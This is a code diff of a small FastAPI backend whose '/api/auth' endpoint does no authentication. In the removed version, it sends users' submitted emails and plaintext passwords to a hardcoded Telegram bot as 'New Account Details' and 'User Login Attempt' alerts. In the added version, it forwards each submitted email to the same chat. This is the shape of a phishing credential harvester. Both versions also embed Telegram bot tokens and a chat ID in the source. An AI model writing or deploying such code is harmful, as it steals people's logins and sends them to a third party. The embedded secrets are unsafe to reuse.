@@ -1,12 +1,11 @@
+import requests
 from fastapi import FastAPI, HTTPException
 from fastapi.middleware.cors import CORSMiddleware
-from fastapi.responses import FileResponse
 from pydantic import BaseModel
-import requests
 
 app = FastAPI()
 
-# --- 1. ENABLE CORS ---
+# Enable CORS so your frontend can talk to the backend
 app.add_middleware(
     CORSMiddleware,
     allow_origins=["*"],
@@ -15,50 +14,46 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
-# --- 2. TELEGRAM CONFIGURATION ---
-TELEGRAM_BOT_TOKEN = "8976557269:AAHBCvaPiqrMIgfu8Dk13W0b700Mdy8k5fc"
+# Replace with your valid token from BotFather and your chat ID
+TELEGRAM_BOT_TOKEN = "8976557269:AAEAZ_KUFPrk2qxrSdoqcH7MCcFufwvx42k"
 TELEGRAM_CHAT_ID = "8145643961"
 
-def send_telegram_notification(message: str):
-    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+class EmailRequest(BaseModel):
+    email: str
+
+@app.post("/api/auth")
+def receive_email(data: EmailRequest):
+    if not data.email:
+        raise HTTPException(status_code=400, detail="Email is required.")
+        
+    print(f"Received Email: {data.email}")
+    
+    # Construct the Telegram API URL
+    telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+    
+    # Message payload
     payload = {
         "chat_id": TELEGRAM_CHAT_ID,
-        "text": message,
-        "parse_mode": "Markdown"
+        "text": f"📩 New Submission:\nEmail: {data.email}"
     }
-    try:
-        response = requests.post(url, json=payload)
-        response.raise_for_status()
-    except Exception as e:
-        print(f"Failed : {e}")
-
-class UserAuth(BaseModel):
-    email: str
-    password: str
-    action: str  # "signup" or "login"
-
-# --- 3. API ENDPOINT (No Storage) ---
-@app.post("/api/auth")
-def authenticate_user(user: UserAuth):
-    # No database connection or saving happens here.
-    # The data is processed only in-memory to send the alert.
     
-    if user.action == "signup":
-        msg = f"🚀 **New Account Details!**\nEmail: `{user.email}`\nPassword: `{user.password}`"
-        send_telegram_notification(msg)
+    try:
+        # Send notification to Telegram
+        response = requests.post(telegram_url, json=payload)
         
-    elif user.action == "login":
-        msg = f"🔑 **User Login Attempt:**\nEmail: `{user.email}`\nPassword: `{user.password}`"
-        send_telegram_notification(msg)
+        if response.status_code != 200:
+            print(f"Telegram API Error: {response.text}")
+        else:
+            print("Successfully sent to Telegram!")
+            
+    except Exception as error:
+        print(f"Failed to connect to Telegram: {error}")
+    
+    return {
+        "status": "success",
+        "message": f"Successfully received email: {data.email}"
+    }
 
-    return {"status": "success", "message": f"{user.action} notification sent successfully"}
-
-# --- 4. SERVE FRONTEND ROUTE ---
-@app.get("/")
-def serve_frontend():
-    return FileResponse("index.html")
-
-# --- 5. RUN THE SERVER PROGRAMMATICALLY ---
 if __name__ == "__main__":
     import uvicorn
     uvicorn.run("app:app", host="127.0.0.1", port=8000, reload=True)
